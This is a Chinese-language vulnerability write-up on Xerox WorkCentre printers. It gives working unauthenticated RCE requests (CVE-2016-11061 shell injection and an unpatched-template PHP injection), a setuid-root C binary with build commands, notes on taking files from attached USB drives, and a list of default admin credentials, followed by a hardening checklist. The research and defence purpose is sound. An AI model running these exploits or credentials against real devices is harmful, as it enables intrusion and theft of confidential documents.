#  Xerox WorkCentre 打印机RCE漏洞分析   
3bytes  3072   2024-06-29 11:30  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yFT9LswNkJKf6sOiaXia3pIExI2tOMtEWic9RTnwawr5nl8bIVxhC9z1bf5OL7n6oLaPajHdp5WCibdzg/640?wx_fmt=png&from=appmsg "")  
  
每个组织都有打印机。有时，其中会有施乐WorkCentre，这些大型机器的重量可能超过100公斤或220磅。  
  
在这篇报告中，我将介绍我在这些打印机中发现的两个未认证的远程代码执行（RCE）漏洞。接下来，我将提供一个清单，以保护您的打印机免受攻击。  
## 初步发现  
  
这是施乐WorkCentre主页的截图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yFT9LswNkJKf6sOiaXia3pIExia7ibWBPFYhCv2ujCBqcicmPryib4EWhjojGU7FtmCQViaibNTLfPicBu2dkQ/640?wx_fmt=png&from=appmsg "")  
  
施乐WorkCentre主页  
  
这个网页默认可以在80端口/http上，如果设置了TLS证书，也可以在443端口/https上。  
  
扫描打印机时要小心。扫描特殊端口，如631/tcp（IPP），可能会导致意外打印大量文档。  
## 固件  
  
施乐WorkCentre的固件可以轻松地从施乐的官方网站下载。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yFT9LswNkJKf6sOiaXia3pIExTcsypYjr9SxW37fU3YiaTcVUav0M850eSHMRPR0GPMHyzHJ4qtJagaA/640?wx_fmt=png&from=appmsg "")  
  
施乐WorkCentre固件下载页面  
  
接下来，可以使用一系列unzip、binwalk -e和tar xf命令来解压。  
## 未认证的远程代码执行 #1  
  
**分配的CVE：** CVE-2016-11061  
  
施乐在2016年修补了这个问题，但当时他们没有为此分配CVE。因此，当这个问题在2020年被重新发现时，我们能够为其分配CVE-2016-11061标识符。  
  
漏洞由configrui.php文件中的简单shell逃逸组成：  
```
<?php

$req=$_POST['req'];
$param=$_POST['param'];
$block=escapeshellcmd($_POST['block']);
$user=escapeshellcmd($_POST['username']);
$isActive=escapeshellcmd($_POST['isActive']);
$isOverride=escapeshellcmd($_POST['isOverride']);

function startRUI($p,$bl,$us,$i,$active,$ov){
    // [已编辑]

    if ("1" === $ov) {
        $reply1 = "ruiAccessResponse ACCEPT";
    } else {
        // [已编辑]
    }

    if (strncmp($reply1,'ruiAccessResponse ACCEPT', 24) === 0) {
     $reply2=exec("/opt/ui/remoteUI/bin/config_remoteui startRUI $p $_SERVER[SERVER_ADDR]");
     if (strncmp($reply2,'<PARAM',6) === 0){
      #将session数据写入ramdisk...
      system("echo \"$bl,$ov,$us,$i\" > /tmp/semFiles/rui_session");
     }
     echo $reply2;
    }
    // [已编辑]
}

if  ("config" === $req) {
    echo $req;
    startRUI($param,$block,$user,$ip,$isActive,$isOverride);
}

// [已编辑]

```  
  
攻击者可以通过发送以下HTTP请求轻松利用它：  
```
POST /support/remoteUI/configrui.php HTTP/1.1
Host: 192.168.0.10
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: [已编辑]

req=config&isOverride=1&param=`要执行的命令`

```  
  
尽管2016年发布了补丁，我们在日常渗透测试中仍然遇到使用2016年及更早版本固件的情况。  
## 未认证的远程代码执行 #2  
  
**分配的CVE：** 无  
  
在2023年，我第一次遇到了一个不受CVE-2016-11061影响的已修补施乐设备。我迅速下载了新固件并检查了补丁：  
```
<?php

$req = $_POST['req'];
$block = escapeshellcmd($_POST['block']);
$user = escapeshellcmd($_POST['username']);
$isActive = escapeshellcmd($_POST['isActive']);
$isOverride = escapeshellcmd($_POST['isOverride']);

// [已编辑]

```  
  
显然，没有更多的操作空间了。施乐只是从代码中移除了$_POST['param']，消除了允许shell注入的参数。  
  
然而，我仔细检查了在一些PHP文件中发现的预处理器指令：  
```
...

<?php
if ( true == $gdisplayScanPreset )
{
?>
var CUSTOM_CHOICE           = "custom";
<?php
}
?>

<script type="text/javascript">
// [已编辑]

// 全局变量
var gCurrentValidationServerPath    = "";
var gCurrentValidationServerProtocol  = '<!-- loa fn=HTTP_Parser_Get_fn arg="xrx_svc_validation 1 MetaDataValidationServerProtocol string" context="js" -->';
var gDocumentInvocations              = '<!-- loa fn=HTTP_Parser_List_Invocations_fn arg="xrx_document" context="js" -->';

// [已编辑]
</script>

...

```  
  
这些预处理器指令是由C代码生成的，该C代码作为Apache模块加载，在PHP代码执行之前。  
  
在找到注入代码的正确位置后，我迅速获得了远程代码执行（RCE）：  
```
POST /userpost/xerox.set HTTP/1.1
Host: 192.168.0.10
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: [已编辑]

_fun_function=HTTP_Parser_Set_fn&DefaultParserFilename=%2Ftmp%2Ftemplate%2Fpool%2Fsystem%2FDEFAULT.XST&NextPage=%2Fscan%2Ftemplate.php%3FParserFilename%3D%2Ftmp%2Ftemplate%2Fpool%2Fweb%2Fabc.XST&ServiceName=xrx_svc_validation&InvocationName=1&AttributeName=MetaDataValidationServerProtocol&AttributeType=string&AttributeValue=111111111%0A%0A%0A<?php+echo+system("ifconfig");exit;?>%0A%0A222222222&Action=update&CopyParserFilename=abc.XST

```  
  
这个漏洞可能难以复现。Apache模块对输入参数敏感，包括它们的顺序。不同型号的施乐打印机之间可能存在差异，该模块也有缓存。  
  
要利用它，更容易截获来自下面界面的请求，该界面可以从主页访问，无需任何认证，并修改MetaDataValidationServerProtocol属性：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yFT9LswNkJKf6sOiaXia3pIExfFxyn2HbQn5bHr3uiacB4HtG5GgnXlvg8w3FkicBdLEQf1iaQDPauEapw/640?wx_fmt=png&from=appmsg "")  
  
模板界面  
  
我们在2023年6月向施乐报告了这个漏洞，以及我偶然发现的两个未认证的缓冲区溢出。根据施乐的说法，所有报告的漏洞都在同一个月得到了修复。然而，在施乐网站上没有发布或找到任何安全公告或CVE。  
  
由于施乐目前是CNA（CVE Numbering Authorities），我们不能自己为这些问题请求CVE。  
## 权限提升和USB接口  
  
在施乐WorkCentre上进行权限提升是直接的，因为设备上除了Apache和PostgreSQL之外的每个守护进程都以root权限运行。  
  
我不能透露提升权限的确切方法，但我可以分享suid二进制的C代码：  
```
#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
 
int _start(void) {
    asm volatile ("mr 3, 1;"
                  "bl __main;");
}
 
int __main(void *sp[])
{
    syscall(SYS_setuid, 0, 0, 0);
    syscall(SYS_setgid, 0, 0, 0);
 
    syscall(SYS_execve, sp[2], &sp[2], 0);
 
    return 0;
}

```  
  
自定义的_start函数不是必需的，但它显著减少了输出文件的大小。  
  
这个suid代码应该使用musl-cross-make编译：  
```
powerpc-linux-musl-gcc -O2 -nostartfiles -static ./suid.c
powerpc-linux-musl-strip ./a.out
powerpc-linux-musl-strip -R .comment ./a.out

```  
  
生成的二进制文件可以在许多PowerPC设备上使用，以促进权限提升。  
  
获得root权限后，可以访问/tmp/usb-sdb1目录，所有外部USB设备都挂载在这里。接下来，可以下载或修改用户的DOCX或PDF文件以继续攻击，即使打印机部分是隔离的。  
## 保护清单  
  
**1.** 更新您的施乐WorkCentre至最新固件。  
  
**2.** 验证您的设备不使用默认凭据：  
```
admin:admin
admin:1111
diag:3424
!$ecivreS:2732
forceonboxlogin:password
guest:2222

```  
  
**3.** 为管理员账户设置强密码，与其他设备不同。  
  
**4.** 如果您在设备上使用邮箱账户发送扫描文档的邮件，请确保邮箱被正确清理，不积累机密文档。  
  
**5.** 在您的本地网络中适当隔离您的打印机。  
## 阅读更多  
  
**1.** Raphaël Rigo, 2020: 施乐安全研究论文  
  
**2.** Nicolas Heiniger, 2021: Compass Security关于施乐WorkCentre的OS命令注入和远程代码执行的咨询  
  
**3.** Rik van Duijn, 2021: 从施乐WorkCentre配置备份中解密密码  
  
**4.** Brendan O’Connor, 2006: Black Hat USA 2006关于施乐打印机的安全性研究  
  
  
